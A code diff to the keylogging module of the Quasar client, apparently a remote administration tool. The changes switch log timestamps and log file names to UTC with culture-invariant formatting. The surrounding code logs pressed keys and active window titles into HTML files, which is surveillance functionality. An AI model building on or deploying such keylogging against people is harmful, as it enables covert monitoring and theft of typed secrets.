@@ -7,6 +7,7 @@ using Quasar.Common.Helpers;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Globalization;
 using System.IO;
 using System.Text;
 using System.Web;
@@ -153,8 +154,8 @@ namespace Quasar.Client.Logging
                 _lastWindowTitle = activeWindowTitle;
                 _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>" 
                     + HttpUtility.HtmlEncode(activeWindowTitle) + " - " 
-                    + DateTime.Now.ToString("HH:mm") 
-                    + "</b>]</p><br>");
+                    + DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo) 
+                    + " UTC</b>]</p><br>");
             }
 
             if (_pressedKeys.ContainsModifierKeys())
@@ -315,7 +316,7 @@ namespace Quasar.Client.Logging
             // TODO: Add some house-keeping and delete old log entries
             bool writeHeader = false;
 
-            string filePath = Path.Combine(Settings.LOGSPATH, DateTime.Now.ToString("MM-dd-yyyy"));
+            string filePath = Path.Combine(Settings.LOGSPATH, DateTime.UtcNow.ToString("yyyy-MM-dd"));
 
             try
             {
@@ -353,7 +354,7 @@ namespace Quasar.Client.Logging
                 {
                     logFile.Append(
                         "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
-                        DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br><br>");
+                        DateTime.UtcNow.ToString("f", DateTimeFormatInfo.InvariantInfo) + " UTC<br><br>");
 
                     logFile.Append("<style>.h { color: 0000ff; display: inline; }</style>");
 
